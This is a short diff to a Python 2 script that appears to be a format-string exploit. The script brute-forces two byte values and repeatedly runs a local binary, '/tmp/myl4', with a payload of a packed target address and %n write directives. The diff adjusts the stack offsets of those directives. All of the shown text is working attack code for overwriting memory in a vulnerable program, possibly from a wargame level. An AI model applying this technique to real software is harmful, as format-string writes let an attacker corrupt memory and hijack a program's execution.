@@ -16,11 +16,11 @@ addr =  "\x0c\xa0\x04\x08" + \
 
 for i in range(1, 255):
         for j in range(1, 255):
-                fmt = addr + "...." + \
-                "%106$n%5$0" + str(i) + "d" + \
-                "%107$n%5$0" + str(j) + "d" + \
-                "%108$n" + \
-                "%109$n"
+                fmt = addr + "" + \
+                "%107$n%5$0" + str(i) + "d" + \
+                "%108$n%5$0" + str(j) + "d" + \
+                "%109$n" + \
+                "%110$n"
                 print "%d %d fmt: %s: " % (i, j, fmt)
                 p = subprocess.Popen(['/tmp/myl4', fmt])
                 
